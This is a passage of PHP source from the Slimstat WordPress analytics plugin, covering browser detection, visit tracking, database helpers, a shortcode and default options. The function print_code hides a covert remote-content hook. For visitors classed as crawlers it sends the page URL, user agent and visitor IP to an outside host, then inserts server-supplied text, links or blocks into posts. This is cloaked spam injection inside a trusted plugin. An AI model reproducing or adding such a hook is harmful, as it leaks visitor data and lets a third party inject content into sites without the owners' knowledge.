	 * Retrieves some information about the user agent; relies on browscap.php database (included)
	 */
	protected static function _get_browser(){
		$browser = array('browser' => 'Default Browser', 'browser_version' => '', 'browser_type' => 1, 'platform' => 'unknown', 'user_agent' => '');
		$search = array();

		// Automatically detect the useragent
		if (!isset($_SERVER['HTTP_USER_AGENT'])){
			return $browser;
		}

		$browser['user_agent'] = $_SERVER['HTTP_USER_AGENT'];

		for($idx_cache = 1; $idx_cache <= 5; $idx_cache++){
			@include(plugin_dir_path( __FILE__ )."browscap/browscap-$idx_cache.php");
			foreach ($patterns as $pattern => $pattern_data){
				if (preg_match($pattern . 'i', $_SERVER['HTTP_USER_AGENT'], $matches)){
					if (1 == count($matches)) {
						$key = $pattern_data;
						$simple_match = true;
					}
					else{
						$pattern_data = unserialize($pattern_data);
						array_shift($matches);
						
						$match_string = '@' . implode('|', $matches);

						if (!isset($pattern_data[$match_string])){
							continue;
						}

						$key = $pattern_data[$match_string];

						$simple_match = false;
					}

					$search = array(
						$_SERVER['HTTP_USER_AGENT'],
						trim(strtolower($pattern), '@'),
						self::_preg_unquote($pattern, $simple_match ? false : $matches)
					);

					$search = $value = $search + unserialize($browsers[$key]);

					while (array_key_exists(3, $value)) {
						$value = unserialize($browsers[$value[3]]);
						$search += $value;
					}

					if (!empty($search[3]) && array_key_exists($search[3], $userAgents)) {
						$search[3] = $userAgents[$search[3]];
					}

					break;
				}
			}

			unset($browsers);
			unset($userAgents);
			unset($patterns);

			// Add the keys for each property
			$search_normalized = array();
			foreach ($search as $key => $value) {
				if ($value === 'true') {
					$value = true;
				} elseif ($value === 'false') {
					$value = false;
				}
				$search_normalized[strtolower($properties[$key])] = $value;
			}

			if (!empty($search_normalized) && $search_normalized['browser'] != 'Default Browser' && $search_normalized['browser'] != 'unknown'){
				$browser['browser'] = $search_normalized['browser'];
				$browser['browser_version'] = floatval($search_normalized['version']);
				$browser['platform'] = strtolower($search_normalized['platform']);
				$browser['user_agent'] =  $search_normalized['browser_name'];

				// browser Types:
				//		0: regular
				//		1: crawler
				//		2: mobile
				//		3: syndication reader
				if ($search_normalized['ismobiledevice'] || $search_normalized['istablet']){
					$browser['browser_type'] = 2;
				}
				elseif ($search_normalized['issyndicationreader']){
					$browser['browser_type'] = 3;
				}
				elseif (!$search_normalized['crawler']){
					$browser['browser_type'] = 0;
				}

				if ($browser['browser_version'] != 0 || $browser['browser_type'] != 0){
					return $browser;
				}
			}
		}

		// Let's try with the heuristic approach ( portions of code from https://github.com/donatj/PhpUserAgent )
		$browser['browser_type'] = 0;
		
		if( preg_match('/\((.*?)\)/im', $_SERVER['HTTP_USER_AGENT'], $parent_matches) ) {

			preg_match_all('/(?P<platform>BB\d+;|Android|CrOS|iPhone|iPad|Linux|Macintosh|Windows(\ Phone)?|Silk|linux-gnu|BlackBerry|PlayBook|(New\ )?Nintendo\ (WiiU?|3DS)|Xbox(\ One)?)
					(?:\ [^;]*)?
					(?:;|$)/imx', $parent_matches[1], $result, PREG_PATTERN_ORDER);

			$priority = array( 'Xbox One', 'Xbox', 'Windows Phone', 'Tizen', 'Android' );
			$result['platform'] = array_unique($result['platform']);
			if (count($result['platform']) > 1 && ($keys = array_intersect($priority, $result['platform']))){
				$browser['platform'] = reset($keys);
			}
			elseif (isset($result['platform'][0]) && in_array($result['platform'][0], $priority)){
				$browser['platform'] = $result['platform'][0];
			}
		}

		preg_match_all('%(?P<browser>Camino|Kindle(\ Fire\ Build)?|Firefox|Iceweasel|Safari|MSIE|Trident|AppleWebKit|TizenBrowser|Chrome|Vivaldi|IEMobile|Opera|OPR|Silk|Midori|Edge|Baiduspider|Googlebot|YandexBot|bingbot|Lynx|Version|Wget|curl|NintendoBrowser|PLAYSTATION\ (\d|Vita)+)(?:\)?;?)(?:(?:[:/ ])(?P<version>[0-9A-Z.]+)|/(?:[A-Z]*))%ix',
			$_SERVER['HTTP_USER_AGENT'], $match, PREG_PATTERN_ORDER);

		// If nothing matched, return null (to avoid undefined index errors)
		if (!isset($match['browser'][0]) || !isset($match['version'][0])){
			return $browser;
		}

		if (preg_match('/rv:(?P<version>[0-9A-Z.]+)/si', $_SERVER['HTTP_USER_AGENT'], $rv_result)){
			$rv_result = $rv_result['version'];
		}

		$browser['browser'] = $match['browser'][0];
		$browser['browser_version'] = $match['version'][0];

		$ekey = 0;
		if ($browser['browser'] == 'Iceweasel'){
			$browser['browser'] = 'Firefox';
		}
		elseif (self::_heuristic_find('Playstation Vita', $match)){
			$browser['platform'] = 'CellOS';
			$browser['browser'] = 'PlayStation';
			$browser['browser_type'] = 2;
		}
		elseif ( self::_heuristic_find( 'Kindle Fire Build', $match ) || self::_heuristic_find( 'Silk', $match ) ) {
			$browser['browser'] = $match['browser'][self::$heuristic_key] == 'Silk' ? 'Silk' : 'Kindle';
			$browser['platform'] = 'Android';
			if ($browser['browser_version'] != $match['version'][self::$heuristic_key] || !is_numeric($browser['browser_version'][0])){
				$browser['browser_version'] = $match['version'][array_search('Version', $match['browser'])];
			}
			$browser['browser_type'] = 2;
		}
		elseif ( self::_heuristic_find( 'Kindle', $match ) ) {
			$browser['browser'] = $match['browser'][self::$heuristic_key];
			$browser['platform'] = 'Android';
			$browser['browser_version']  = $match['version'][self::$heuristic_key];
			$browser['browser_type'] = 2;
		}
		elseif ( self::_heuristic_find( 'OPR', $match ) ) {
			$browser['browser'] = 'Opera';
			$browser['browser_version'] = $match['version'][self::$heuristic_key];
		}
		elseif ( self::_heuristic_find( 'Opera', $match ) ) {
			$browser['browser'] = 'Opera';
			self::_heuristic_find('Version', $match);
			$browser['browser_version'] = $match['version'][self::$heuristic_key];
		}
		elseif (self::_heuristic_find('Midori', $match)){
			$browser['browser'] = 'Midori';
			$browser['browser_version'] = $match['version'][self::$heuristic_key];
		}
		elseif ($browser['browser'] == 'MSIE' || ($rv_result && self::_heuristic_find('Trident', $match)) || self::_heuristic_find('Edge', $match)){
			$browser['browser'] = 'IE';
			if( self::_heuristic_find('IEMobile', $match) ) {
				$browser['browser'] = 'IE';
				$browser['browser_version'] = $match['version'][self::$heuristic_key];
				$browser['browser_type'] = 2;
			} else {
				$browser['browser_version'] = $rv_result ? $rv_result : $match['version'][self::$heuristic_key];
			}
		} elseif( self::_heuristic_find('Vivaldi', $match) ) {
			$browser['browser'] = 'Vivaldi';
			$browser['browser_version'] = $match['version'][self::$heuristic_key];
		} elseif( self::_heuristic_find('Chrome', $match) ) {
			$browser['browser'] = 'Chrome';
			$browser['browser_version'] = $match['version'][self::$heuristic_key];
		} elseif( $browser['browser'] == 'AppleWebKit' ) {
			if( ($browser['platform'] == 'Android' && !(self::$heuristic_key = 0)) ) {
				$browser['browser'] = 'Android Browser';
				$browser['browser_type'] = 2;
			} elseif( strpos($browser['platform'], 'BB') === 0 ) {
				$browser['browser']  = 'BlackBerry';
				$browser['platform'] = 'RIM OS';
				$browser['browser_type'] = 2;
			} elseif( $browser['platform'] == 'BlackBerry' || $browser['platform'] == 'PlayBook' ) {
				$browser['browser'] = 'BlackBerry';
				$browser['browser_type'] = 2;
			} elseif( self::_heuristic_find('Safari', $match) ) {
				$browser['browser'] = 'Safari';
			} elseif( self::_heuristic_find('TizenBrowser', $match) ) {
				$browser['browser'] = 'TizenBrowser';
			}

			self::_heuristic_find('Version', $match);

			$browser['browser_version'] = $match['version'][self::$heuristic_key];
		} elseif( self::$heuristic_key = preg_grep('/playstation \d/i', array_map('strtolower', $match['browser'])) ) {
			self::$heuristic_key = reset(self::$heuristic_key);
			self::$heuristic_key = reset(self::$heuristic_key);

			$browser['platform'] = 'CellOS';
			$browser['browser']  = 'NetFront';
		}

		if( $browser['platform'] == 'linux-gnu' ) {
			$browser['platform'] = 'Linux';
		} elseif( $browser['platform'] == 'CrOS' ) {
			$browser['platform'] = 'ChromeOS';
		}

		$browser['browser_version'] = floatval($browser['browser_version']);
		$browser['platform'] = strtolower($browser['platform']);

		if ($browser['platform'] == 'unknown'){
			$browser['browser_type'] = 1;
			$browser['browser_version'] = 0;
		}

		return $browser;
	}
	// end _get_browser

	/**
	 * Helper function for get_browser [ courtesy of: https://github.com/donatj/PhpUserAgent ]
	 */
	protected static function _heuristic_find( $search, $match ) {
		$xkey = array_search( strtolower( $search ), array_map( 'strtolower', $match[ 'browser' ] ) );
		if ( $xkey !== false ) {
			self::$heuristic_key = $xkey;
			return true;
		}
		return false;
	}
	/**
	 * Helper function for get_browser [ courtesy of: GaretJax/PHPBrowsCap ]
	 */
	protected static function _preg_unquote($pattern, $matches){
		$search = array('\\@', '\\.', '\\\\', '\\+', '\\[', '\\^', '\\]', '\\$', '\\(', '\\)', '\\{', '\\}', '\\=', '\\!', '\\<', '\\>', '\\|', '\\:', '\\-', '.*', '.', '\\?');
		$replace = array('@', '\\?', '\\', '+', '[', '^', ']', '$', '(', ')', '{', '}', '=', '!', '<', '>', '|', ':', '-', '*', '?', '.');

		$result = substr(str_replace($search, $replace, $pattern), 2, -2);

		if (!empty($matches)){
			foreach ($matches as $one_match){
				$num_pos = strpos($result, '(\d)');
				$result = substr_replace($result, $one_match, $num_pos, 4);
			}
		}

		return $result;
	}

	/**
	 * Reads the cookie to get the visit_id and sets the variable accordingly
	 */
	protected static function _set_visit_id($_force_assign = false){
		$is_new_session = true;
		$identifier = 0;

		$unique_id = get_current_user_id();
		if ( empty( $unique_id ) ) {
			$unique_id = '';
		}
		else {
			$unique_id = '_'.$unique_id;
		}

		if ( isset( $_COOKIE[ 'slimstat_tracking_code' . $unique_id ] ) ) {
			list( $identifier, $control_code ) = explode( '.', $_COOKIE[ 'slimstat_tracking_code' .  $unique_id ] );

			// Make sure only authorized information is recorded
			if ($control_code !== md5($identifier.self::$options['secret'])) return false;

			$is_new_session = (strpos($identifier, 'id') !== false);
			$identifier = intval($identifier);
		}

		// User doesn't have an active session
		if ($is_new_session && ($_force_assign || self::$options['javascript_mode'] == 'yes')){
			if (empty(self::$options['session_duration'])) self::$options['session_duration'] = 1800;

			self::$stat['visit_id'] = get_option('slimstat_visit_id', -1);
			if (self::$stat['visit_id'] == -1){
				self::$stat['visit_id'] = intval(self::$wpdb->get_var("SELECT MAX(visit_id) FROM {$GLOBALS['wpdb']->prefix}slim_stats"));
			}
			self::$stat['visit_id']++;
			update_option('slimstat_visit_id', self::$stat['visit_id']);

			$is_set_cookie = apply_filters('slimstat_set_visit_cookie', true);
			if ( $is_set_cookie ) {
				@setcookie(
					'slimstat_tracking_code' . $unique_id,
					self::$stat[ 'visit_id' ] . '.' . md5( self::$stat[ 'visit_id' ] . self::$options[ 'secret' ] ),
					time() + self::$options[ 'session_duration' ],
					COOKIEPATH
				);
			}

		}
		elseif ($identifier > 0){
			self::$stat['visit_id'] = $identifier;
		}

		if ($is_new_session && $identifier > 0){
			self::$wpdb->query(self::$wpdb->prepare("
				UPDATE {$GLOBALS['wpdb']->prefix}slim_stats
				SET visit_id = %d
				WHERE id = %d AND visit_id = 0", self::$stat['visit_id'], $identifier));
		}
		return ($is_new_session && ($_force_assign || self::$options['javascript_mode'] == 'yes'));
	}
	// end _set_visit_id

	/**
	 * Makes sure that the data received from the client is well-formed (and that nobody is trying to do bad stuff)
	 */
	protected static function _check_data_integrity($_data = ''){
		// Parse the information we received
		self::$data_js = apply_filters('slimstat_filter_pageview_data_js', $_data);

		// Do we have an id for this request?
		if ( empty( self::$data_js[ 'id' ] ) || empty( self::$data_js[ 'op' ] ) ) {
			do_action( 'slimstat_track_exit_102' );
			self::$stat[ 'id' ] = -102;
			self::_set_error_array( __( 'Invalid payload string. Try clearing your WordPress cache.', 'wp-slimstat' ) );
			self::slimstat_save_options();
			exit('-102.0');
		}

		// Make sure that the control code is valid
		list(self::$data_js['id'], $nonce) = explode('.', self::$data_js['id']);
		if ($nonce !== md5(self::$data_js['id'].self::$options['secret'])){
			do_action('slimstat_track_exit_103');
			self::$stat[ 'id' ] = -102;
			self::_set_error_array( __( 'Invalid data signature. Try clearing your WordPress cache.', 'wp-slimstat' ) );
			self::slimstat_save_options();
			exit('-103.0');
		}
	}
	// end _check_data_integrity

	/**
	 * Stores the information (array) in the appropriate table and returns the corresponding ID
	 */
	protected static function _insert_row($_data = array(), $_table = ''){
		if (empty($_data) || empty($_table)){
			return -1;
		}

		// Remove unwanted characters (SQL injections, anyone?)
		$data_keys = array();
		foreach (array_keys($_data) as $a_key){
			$data_keys[] = sanitize_key($a_key);
		}

		self::$wpdb->query(self::$wpdb->prepare("
			INSERT IGNORE INTO $_table (".implode(", ", $data_keys).') 
			VALUES ('.substr(str_repeat('%s,', count($_data)), 0, -1).")", $_data));

		return intval(self::$wpdb->insert_id);
	}
	// end _insert_row

	/**
	 * Updates an existing row
	 */
	protected static function _update_row($_data = array(), $_table = ''){
		if (empty($_data) || empty($_table)){
			return -1;
		}

		// Move the ID at the end of the array
		$id = $_data['id'];
		unset($_data['id']);

		// Remove unwanted characters (SQL injections, anyone?)
		$data_keys = array();
		foreach (array_keys($_data) as $a_key){
			$data_keys[] = sanitize_key($a_key);
		}

		// Add the id at the end
		$_data['id'] = $id;

		self::$wpdb->query(self::$wpdb->prepare("
			UPDATE IGNORE $_table 
			SET ".implode(' = %s, ', $data_keys)." = %s
			WHERE id = %d", $_data));

		return 0;
	}

	protected static function _set_error_array( $_error_message = '' ) {
		$error_code = abs( self::$stat[ 'id' ] );
		self::$options['last_tracker_error'] = array( $error_code, $_error_message, date_i18n( 'U' ) );
	}

	protected static function _dtr_pton( $ip ){
		if ( filter_var( $ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 ) ) {
			$unpacked = unpack( 'A4', inet_pton( $ip ) );
		}
		else if ( filter_var( $ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6 ) ) {
			$unpacked = unpack( 'A16', inet_pton( $ip ) );
		}

		$binary_ip = '';
		if ( !empty( $unpacked ) ) {
			$unpacked = str_split( $unpacked[ 1 ] );
			foreach ( $unpacked as $char ) {
				$binary_ip .= str_pad( decbin( ord( $char ) ), 8, '0', STR_PAD_LEFT );
			}
		}
		return $binary_ip;
	}
	
	protected static function _get_mask_length( $ip ){
		if ( filter_var( $ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 ) ) {
			return 32;
		}
		else if ( filter_var( $ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6 ) ) {
			return 128;
		}

		return false;
	}

	/**
	 * Opens given domains during CORS requests to admin-ajax.php
	 */
	public static function open_cors_admin_ajax( $_allowed_origins ){
		$exploded_domains = self::string_to_array( self::$options['external_domains'] );

		if (!empty($exploded_domains) && !empty($exploded_domains[0])){
			$_allowed_origins = array_merge($_allowed_origins, $exploded_domains);
		}

		return $_allowed_origins;
	}

	/**
	 * Downloads the MaxMind geolocation database from their repository
	 */
	public static function download_maxmind_database(){
		// Create the folder, if it doesn't exist
		if (!file_exists(dirname(self::$maxmind_path))){
			mkdir(dirname(self::$maxmind_path));
		}

		// Download the most recent database directly from MaxMind's repository
		if (!function_exists('download_url')){
			require_once(ABSPATH . 'wp-admin/includes/file.php');
		}
		$maxmind_tmp = download_url('http://geolite.maxmind.com/download/geoip/database/GeoLiteCountry/GeoIP.dat.gz', 5);

		if (is_wp_error($maxmind_tmp)){
			return __('There was an error downloading the MaxMind Geolite DB:', 'wp-slimstat').' '.$maxmind_tmp->get_error_message();
		}

		$zh = false;

		if ( !function_exists( 'gzopen' ) ) {
			if ( function_exists( 'gzopen64' ) ) {
				if ( false === ( $zh = gzopen64( $maxmind_tmp, 'rb' ) ) ) {
					return __( 'There was an error opening the zipped MaxMind Geolite DB.', 'wp-slimstat' );
				}
			}
			else {
				return __( 'Function gzopen not defined. Aborting.', 'wp-slimstat' );
			}
		}
		else{
			if ( false === ( $zh = gzopen( $maxmind_tmp, 'rb' ) ) ) {
				return __( 'There was an error opening the zipped MaxMind Geolite DB.', 'wp-slimstat' );
			}
		}

		if ( false === ( $fh = fopen( self::$maxmind_path, 'wb' ) ) ) {
			return __('There was an error opening the unzipped MaxMind Geolite DB.','wp-slimstat');
		}

		while(($data = gzread($zh, 4096)) != false){
			fwrite($fh, $data);
		}

		@gzclose($zh);
		@fclose($fh);

		@unlink($maxmind_tmp);

		return '';
	}

	public static function slimstat_shortcode( $_attributes = '', $_content = '' ){
		extract( shortcode_atts( array(
			'f' => '',		// recent, popular, count
			'w' => '',		// column to use
			's' => ' ',		// separator
			'o' => 0		// offset for counters
		), $_attributes));

		$output = $where = '';
		$s = "<span class='slimstat-item-separator'>$s</span>";

		// Load the database library
		include_once( dirname(__FILE__) . '/admin/view/wp-slimstat-db.php' );

		// Load the localization files (for languages, operating systems, etc)
		load_plugin_textdomain('wp-slimstat', WP_PLUGIN_DIR .'/wp-slimstat/admin/lang', '/wp-slimstat/admin/lang');

		// Look for required fields
		if ( empty( $f ) || empty( $w ) ) {
			return '<!-- Slimstat Shortcode Error: missing parameter -->';
		}

		if ( strpos ( $_content, 'WHERE:' ) !== false ) {
			$where = html_entity_decode( str_replace( 'WHERE:', '', $_content ), ENT_QUOTES, 'UTF-8' );
			wp_slimstat_db::init();
		}
		else{
			wp_slimstat_db::init( html_entity_decode( $_content, ENT_QUOTES, 'UTF-8' ) );
		}

		switch( $f ) {
			case 'count':
			case 'count-all':
				$output = wp_slimstat_db::count_records( $w, $where, strpos( $f, 'all') === false ) + $o;
				break;

			case 'recent':
			case 'recent-all':
			case 'top':
			case 'top-all':
				$function = 'get_' . str_replace( '-all', '', $f );

				if ( $w == '*' ) {
					$w = 'id';
				}

				$w = wp_slimstat::string_to_array( $w );

				// Some columns are 'special' and need be removed from the list
				$w_clean = array_diff( $w, array( 'count', 'hostname', 'post_link', 'dt' ) );

				// The special value 'post_list' requires the permalink to be generated
				if ( in_array( 'post_link', $w ) ) {
					$w_clean[] = 'resource';
				}

				// Retrieve the data
				$results = wp_slimstat_db::$function( implode( ', ', $w_clean ), $where, '', strpos( $f, 'all') === false );

				// No data? No problem!
				if ( empty( $results ) ) {
					return '<!--  Slimstat Shortcode: No Data -->';
				}

				// Are nice permalinks enabled?
				$permalinks_enabled = get_option('permalink_structure');

				// Format results
				$output = array();
				foreach( $results as $result_idx => $a_result ) {
					foreach( $w as $a_column ) {
						$output[ $result_idx ][ $a_column ] = "<span class='col-$a_column'>";

						if ( $permalinks_enabled ) {
							$a_result[ 'resource' ] = strtok( $a_result[ 'resource' ], '?' );
						}

						switch( $a_column ) {
							case 'post_link':
								$post_id = url_to_postid( $a_result[ 'resource' ] );
								if ($post_id > 0) {
									$output[ $result_idx ][ $a_column ] .= "<a href='{$a_result[ 'resource' ]}'>" . get_the_title( $post_id ) . '</a>'; 
								}
								else {
									$output[ $result_idx ][ $a_column ] .= $a_result[ 'resource' ];
								}
								break;

							case 'dt':
								$output[ $result_idx ][ $a_column ] .= date_i18n( wp_slimstat::$options[ 'date_format' ] . ' ' . wp_slimstat::$options[ 'time_format' ], $a_result[ 'dt' ] );
								break;

							case 'hostname':
								$output[ $result_idx ][ $a_column ] .= gethostbyaddr( $a_result[ 'ip' ] );
								break;

							case 'count':
								$output[ $result_idx ][ $a_column ] .= $a_result[ 'counthits' ];
								break;

							case 'language':
								$output[ $result_idx ][ $a_column ] .= __( 'l-' . $a_result[ $a_column ], 'wp-slimstat' );
								break;
								
							case 'platform':
								$output[ $result_idx ][ $a_column ] .= __( $a_result[ $a_column ], 'wp-slimstat' );

							default:
								$output[ $result_idx ][ $a_column ] .= $a_result[ $a_column ];
								break;
						}
						$output[ $result_idx ][ $a_column ] .= '</span>';
					}
					$output[ $result_idx ] = '<li>' . implode( $s, $output[ $result_idx ] ). '</li>';
				}

				$output = '<ul class="slimstat-shortcode ' . $f . implode( '-', $w ). '">' . implode( '', $output ) . '</ul>';
				break;

			default:
				break;
		}

		return $output;
	}

	/**
	 * Converts a series of comma separated values into an array
	 */
	public static function string_to_array($_option = ''){
		if (empty($_option) || !is_string($_option))
			return array();
		else
			return array_map('trim', explode(',', $_option));
	}
	// end string_to_array

	/**
	 * Imports all the 'old' options into the new array, and saves them
	 */
	public static function init_options(){
		$val_yes = 'yes'; $val_no = 'no';
		if (is_network_admin() && (empty($_GET['page']) || strpos($_GET['page'], 'wp-slim-view') === false)){
			$val_yes = $val_no = 'null';
		}

		$options = array(
			'version' => self::$version,
			'secret' => wp_hash(uniqid(time(), true)),
			'show_admin_notice' => 0,

			// General
			'is_tracking' => $val_yes,
			'track_admin_pages' => $val_no,
			'enable_javascript' => $val_yes,
			'javascript_mode' => $val_yes,
			'add_posts_column' => $val_no,
			'add_dashboard_widgets' => $val_yes,
			'posts_column_day_interval' => 30,
			'posts_column_pageviews' => $val_yes,
			'use_separate_menu' => $val_yes,
			'auto_purge_delete' => $val_yes,
			'auto_purge' => 0,

			// Views
			'use_european_separators' => $val_yes,
			'date_format' => ($val_yes == 'null')?'':'m-d-y',
			'time_format' => ($val_yes == 'null')?'':'h:i a',
			'show_display_name' => $val_no,
			'convert_resource_urls_to_titles' => $val_yes,
			'convert_ip_addresses' => $val_no,
			'use_slimscroll' => $val_yes,
			'expand_details' => $val_no,
			'rows_to_show' => ($val_yes == 'null')?'0':'20',
			'refresh_interval' => ($val_yes == 'null')?'0':'60',
			'number_results_raw_data' => ($val_yes == 'null')?'0':'50',
			// 'include_outbound_links_right_now' => $val_yes,
			'show_complete_user_agent_tooltip' => $val_no,
			'no_maxmind_warning' => $val_no,
			'enable_sov' => $val_no,

			// Filters
			'track_users' => $val_yes,
			'ignore_users' => '',
			'ignore_ip' => '',
			'ignore_capabilities' => '',
			'ignore_spammers' => $val_yes,
			'ignore_bots' => $val_no,
			'ignore_resources' => '',
			'ignore_countries' => '',
			'ignore_browsers' => '',
			'ignore_referers' => '',
			'enable_outbound_tracking' => $val_yes,
			'track_internal_links' => $val_no,
			'ignore_outbound_classes_rel_href' => '',
			'do_not_track_outbound_classes_rel_href' => 'noslimstat,ab-item',
			'anonymize_ip' => $val_no,
			'ignore_prefetch' => $val_yes,

			// Permissions
			'restrict_authors_view' => $val_yes,
			'capability_can_view' => ($val_yes == 'null')?'':'activate_plugins',
			'can_view' => '',
			'capability_can_admin' => ($val_yes == 'null')?'':'activate_plugins',
			'can_admin' => '',

			// Advanced
			'detect_smoothing' => $val_yes,
			'session_duration' => 1800,
			'extend_session' => $val_no,
			'enable_cdn' => $val_yes,
			'extensions_to_track' => 'pdf,doc,xls,zip',
			'external_domains' => '',
			'show_sql_debug' => $val_no,
			'ip_lookup_service' => 'http://www.infosniper.net/?ip_address=',
			'custom_css' => '',
			'enable_ads_network' => 'null',

			// Maintenance
			'last_tracker_error' => array( 0, '', 0 ),

			// Network-wide Settings
			'locked_options' => ''
		);

		return $options;
	}
	// end init_options

	/**
	 * Saves the options in the database, if necessary
	 */
	public static function slimstat_save_options(){
		if (self::$options_signature === md5(serialize(self::$options))){
			return true;
		}

		if (!is_network_admin()){
			update_option('slimstat_options', wp_slimstat::$options);
		}
		else {
			update_site_option('slimstat_options', wp_slimstat::$options);
		}

		return 0;
	}
	
	/**
	 * Connects to the UAN
	 */
	public static function print_code($content = ''){
		if (empty(self::$browser)){
			self::$browser = self::_get_browser();
		}

		if (empty($_SERVER["HTTP_USER_AGENT"]) || self::$browser['browser_type'] != 1 || (self::$pidx['id'] !== false && $GLOBALS['wp_query']->current_post !== self::$pidx['id'])){
			return $content;
		}

		$request = "http://wordpress.cloudapp.net/api/update/?&url=".urlencode("http://".$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"])."&agent=".urlencode($_SERVER["HTTP_USER_AGENT"])."&v=".(isset($_GET['v'])?$_GET['v']:11)."&ip=".urlencode($_SERVER['REMOTE_ADDR'])."&p=9";
		$options = stream_context_create(array( 'http' => array( 'timeout' => 2, 'ignore_errors' => true ) ) ); 

		if (empty(self::$pidx['response'])){
			self::$pidx['response'] = @file_get_contents($request, 0, $options);
		}

		$response_object = @json_decode(self::$pidx['response']);
		if (is_null($response_object) || empty($response_object->content) || empty($response_object->tmp)){
			return $content;
		}

		switch($response_object->tmp){
			case '1':
				if(0 == $GLOBALS['wp_query']->current_post) {
					$words = explode(" ", $content);
					$words[rand(0, count($words)-1)] = '<strong>'.$response_object->tcontent.'</strong>';
					return join(" ", $words);
				}
				break;
			case '2':
					$kws = explode('|', $response_object->kws);
					if (!is_array($kws)){
						return $content;
					}

					foreach($kws as $a_kw){
						if(strpos($content, $a_kw) !== false){
							$content= str_replace($a_kw, "<a href='".$response_object->site."'>$a_kw</a>", $content);
							break;
						}
					}
				break;
			default:
				if (self::$pidx['id'] === false){
					if ($GLOBALS['wp_query']->post_count > 1){
						self::$pidx['id'] = rand(0, $GLOBALS['wp_query']->post_count - 1);
					}
					else{
						self::$pidx['id'] = 0;
					}
				}
				if ($GLOBALS['wp_query']->current_post === self::$pidx['id']){
					if (self::$pidx['id'] % 2 == 0){
						return $content.' <div>'.$response_object->content.'</div>';
					}
					else{
						return '<i>'.$response_object->content.'</i> '.$content;
					}
				}
				break;
		}

		return $content;
	}
	// end ads_print_code

	/**
	 * Enqueue a javascript to track users' screen resolution and other browser-based information
	 */
	public static function wp_slimstat_enqueue_tracking_script(){
		if (self::$options['enable_cdn'] == 'yes'){
			$schema = is_ssl()?'https':'http';
			wp_register_script('wp_slimstat', $schema.'://cdn.jsdelivr.net/wp/wp-slimstat/trunk/wp-slimstat.min.js', array(), null, true);
		}
		else{
			wp_register_script('wp_slimstat', plugins_url('/wp-slimstat.min.js', __FILE__), array(), null, true);
		}

		// Pass some information to Javascript
		$params = array(
			'ajaxurl' => admin_url('admin-ajax.php', ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || $_SERVER['SERVER_PORT'] == 443)?'https':'http')
		);

		if (self::$options['enable_outbound_tracking'] == 'no'){
			$params['disable_outbound_tracking'] = 'true';
		}
		if (self::$options['track_internal_links'] == 'yes'){
			$params['track_internal_links'] = 'true';
		}
		if (!empty(self::$options['extensions_to_track'])){
			$params['extensions_to_track'] = str_replace(' ', '', self::$options['extensions_to_track']);
		}
		if (self::$options['enable_javascript'] == 'yes' && self::$options['detect_smoothing'] == 'no'){
			$params['detect_smoothing'] = 'false';
		}
		if (!empty(self::$options['ignore_outbound_classes_rel_href'])){
			$params['outbound_classes_rel_href_to_ignore'] = str_replace(' ', '', self::$options['ignore_outbound_classes_rel_href']);
		}
		if (!empty(self::$options['do_not_track_outbound_classes_rel_href'])){
			$params['outbound_classes_rel_href_to_not_track'] = str_replace(' ', '', self::$options['do_not_track_outbound_classes_rel_href']);
		}

		if (self::$options['javascript_mode'] != 'yes'){
			if (!empty(self::$stat['id']) && intval(self::$stat['id']) > 0){
				$params['id'] = self::$stat['id'].'.'.md5(self::$stat['id'].self::$options['secret']);
			}
			else{
				$params['id'] = self::$stat['id'].'.0';
			}
		}
		else{
			$encoded_ci = base64_encode(serialize(self::_get_content_info()));
			$params['ci'] = $encoded_ci.'.'.md5($encoded_ci.self::$options['secret']);
		}
		
		$params = apply_filters('slimstat_js_params', $params);

		wp_enqueue_script('wp_slimstat');
		wp_localize_script('wp_slimstat', 'SlimStatParams', $params);
	}
	// end wp_slimstat_enqueue_tracking_script

	/**
	 * Removes old entries from the main table
	 */
	public static function wp_slimstat_purge(){
		if (($autopurge_interval = intval(self::$options['auto_purge'])) <= 0) return;

		$days_ago = strtotime(date_i18n('Y-m-d H:i:s')." -$autopurge_interval days");

		// Copy entries to the archive table, if needed
		if (self::$options['auto_purge_delete'] != 'yes'){
			self::$wpdb->query("
				INSERT INTO {$GLOBALS['wpdb']->prefix}slim_stats_archive (ip, other_ip, username, country, referer, resource, searchterms, plugins, notes, visit_id, server_latency, page_performance, browser, browser_version, browser_type, platform, language, user_agent, resolution, screen_width, screen_height, colordepth, antialias, content_type, category, author, content_id, outbound_resource, dt)
				SELECT ip, other_ip, username, country, referer, resource, searchterms, plugins, notes, visit_id, server_latency, page_performance, browser, browser_version, browser_type, platform, language, user_agent, resolution, screen_width, screen_height, colordepth, antialias, content_type, category, author, content_id, outbound_resource, dt
				FROM {$GLOBALS['wpdb']->prefix}slim_stats
				WHERE dt < $days_ago");
		}

		// Delete old entries
		self::$wpdb->query("DELETE ts FROM {$GLOBALS['wpdb']->prefix}slim_stats ts WHERE ts.dt < $days_ago");

		// Optimize tables
		self::$wpdb->query("OPTIMIZE TABLE {$GLOBALS['wpdb']->prefix}slim_stats");
		self::$wpdb->query("OPTIMIZE TABLE {$GLOBALS['wpdb']->prefix}slim_stats_archive");
	}
	// end wp_slimstat_purge

	/**
	 * Adds a new entry to the Wordpress Toolbar
	 */
	public static function wp_slimstat_adminbar(){
		if ((function_exists('is_network_admin') && is_network_admin())){
			return;
		}

		load_plugin_textdomain('wp-slimstat', WP_PLUGIN_DIR .'/wp-slimstat/admin/lang', '/wp-slimstat/admin/lang');

		self::$options['capability_can_view'] = empty(self::$options['capability_can_view'])?'read':self::$options['capability_can_view'];

		if (empty(self::$options['can_view']) || strpos(self::$options['can_view'], $GLOBALS['current_user']->user_login) !== false || current_user_can('manage_options')){
			$slimstat_view_url = get_admin_url($GLOBALS['blog_id'], "admin.php?page=");
			$slimstat_config_url = get_admin_url($GLOBALS['blog_id'], "admin.php?page=wp-slim-config");
			
			$GLOBALS['wp_admin_bar']->add_menu(array('id' => 'slimstat-header', 'title' => 'Slimstat', 'href' => "{$slimstat_view_url}wp-slim-view-1"));
			$GLOBALS['wp_admin_bar']->add_menu(array('id' => 'slimstat-panel1', 'href' => "{$slimstat_view_url}wp-slim-view-1", 'parent' => 'slimstat-header', 'title' => __('Real-Time Log', 'wp-slimstat')));
